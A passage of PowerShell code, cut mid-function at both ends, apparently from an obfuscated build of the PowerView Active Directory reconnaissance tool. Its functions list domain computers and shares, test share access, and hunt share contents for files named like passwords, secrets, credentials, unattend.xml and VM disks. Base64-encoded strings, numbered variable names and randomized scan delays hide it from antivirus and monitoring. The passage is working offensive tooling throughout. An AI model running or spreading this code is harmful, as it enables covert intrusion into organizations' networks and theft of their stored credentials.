        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBzACAAJAB7ADgAOAB9AA==')))
        if (${88}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        ${87} = {
            Param(${94}, ${f9}, ${f8}, $MaxEvents, ${103}, $Filter, $Credential)
            ForEach (${89} in ${94}) {
                ${93} = Test-Connection -Count 1 -Quiet -ComputerName ${89}
                if (${93}) {
                    ${104} = @{
                        'ComputerName' = ${89}
                    }
                    if (${f9}) { ${104}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFQAaQBtAGUA')))] = ${f9} }
                    if (${f8}) { ${104}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAVABpAG0AZQA=')))] = ${f8} }
                    if ($MaxEvents) { ${104}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgARQB2AGUAbgB0AHMA')))] = $MaxEvents }
                    if ($Credential) { ${104}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    if ($Filter -or ${103}) {
                        if (${103}) {
                            f83 @104 | ? {${103} -contains $_.TargetUserName}
                        }
                        else {
                            ${107} = 'or'
                            $Filter.Keys | % {
                                if (($_ -eq 'Op') -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA'))))) {
                                        ${107} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA')))
                                    }
                                }
                            }
                            ${106} = $Filter.Keys | ? {($_ -ne 'Op') -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))}
                            f83 @104 | % {
                                if (${107} -eq 'or') {
                                    ForEach (${105} in ${106}) {
                                        if ($_."${105}" -match $Filter[${105}]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach (${105} in ${106}) {
                                        if ($_."${105}" -notmatch $Filter[${105}]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        f83 @104
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $(${88}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${90} = 0
            ${91} = New-Object System.Random
            ForEach (${89} in ${88}) {
                ${90} = ${90} + 1
                sleep -Seconds ${91}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserEvent] Enumerating server ${89} (${90} of $(${88}.count))"
                ${58} = icm -ScriptBlock ${87} -ArgumentList ${89}, ${f9}, ${f8}, $MaxEvents, ${103}, $Filter, $Credential
                ${58}
                if (${58} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            ${86} = @{
                'StartTime' = ${f9}
                'EndTime' = ${f8}
                'MaxEvents' = $MaxEvents
                'TargetUsers' = ${103}
                'Filter' = $Filter
                'Credential' = $Credential
            }
            f76 -94 ${88} -f12 ${87} -f11 ${86} -Threads $Threads
        }
    }
}
function Find-DomainShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${94},
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${96} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${f5} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${f4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${f3} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${88} = ${94}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${88} = f79 @96 | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $(${88}.Length)"
        if (${88}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${87} = {
            Param(${94}, $CheckShareAccess, ${f2})
            if (${f2}) {
                $Null = f77 -f2 ${f2} -f39
            }
            ForEach (${89} in ${94}) {
                ${93} = Test-Connection -Count 1 -Quiet -ComputerName ${89}
                if (${93}) {
                    ${102} = f82 -94 ${89}
                    ForEach (${99} in ${102}) {
                        ${101} = ${99}.Name
                        $Path = '\\'+${89}+'\'+${101}
                        if ((${101}) -and (${101}.trim() -ne '')) {
                            if ($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    ${99}
                                }
                                catch {
                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABzAGgAYQByAGUAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                            else {
                                ${99}
                            }
                        }
                    }
                }
            }
            if (${f2}) {
                f75
            }
        }
        ${85} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${85} = f77 -Credential $Credential
            }
            else {
                ${85} = f77 -Credential $Credential -f39
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainShare] Total number of hosts: $(${88}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${90} = 0
            ${91} = New-Object System.Random
            ForEach (${89} in ${88}) {
                ${90} = ${90} + 1
                sleep -Seconds ${91}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainShare] Enumerating server ${89} (${90} of $(${88}.count))"
                icm -ScriptBlock ${87} -ArgumentList ${89}, $CheckShareAccess, ${85}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${86} = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = ${85}
            }
            f76 -94 ${88} -f12 ${87} -f11 ${86} -Threads $Threads
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Find-InterestingDomainShareFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${94},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,
        [String[]]
        $ExcludedShares = @('C$', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0ACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${96} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${f4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${f3} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${88} = ${94}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${88} = f79 @96 | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $(${88}.Length)"
        if (${88}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${87} = {
            Param(${94}, $Include, $ExcludedShares, $OfficeDocs, ${f7}, $FreshEXEs, ${f6}, ${f2})
            if (${f2}) {
                $Null = f77 -f2 ${f2} -f39
            }
            ForEach (${89} in ${94}) {
                ${100} = @()
                if (${89}.StartsWith('\\')) {
                    ${100} += ${89}
                }
                else {
                    ${93} = Test-Connection -Count 1 -Quiet -ComputerName ${89}
                    if (${93}) {
                        ${102} = f82 -94 ${89}
                        ForEach (${99} in ${102}) {
                            ${101} = ${99}.Name
                            $Path = '\\'+${89}+'\'+${101}
                            if ((${101}) -and (${101}.Trim() -ne '')) {
                                if ($ExcludedShares -NotContains ${101}) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        ${100} += $Path
                                    }
                                    catch {
                                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIABhAGMAYwBlAHMAcwAgAHQAbwAgACQAUABhAHQAaAA=')))
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach (${99} in ${100}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABzAGgAYQByAGUAOgAgACQAewA5ADkAfQA=')))
                    ${98} = @{
                        'Path' = ${99}
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        ${98}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        ${98}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        ${98}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABBAGMAYwBlAHMAcwBUAGkAbQBlAA==')))] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        ${98}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        ${98}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] = $CreationTime
                    }
                    if (${f6}) {
                        ${98}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] = ${f6}
                    }
                    f81 @98
                }
            }
            if (${f2}) {
                f75
            }
        }
        ${85} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${85} = f77 -Credential $Credential
            }
            else {
                ${85} = f77 -Credential $Credential -f39
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $(${88}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${90} = 0
            ${91} = New-Object System.Random
            ForEach (${89} in ${88}) {
                ${90} = ${90} + 1
                sleep -Seconds ${91}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server ${89} (${90} of $(${88}.count))"
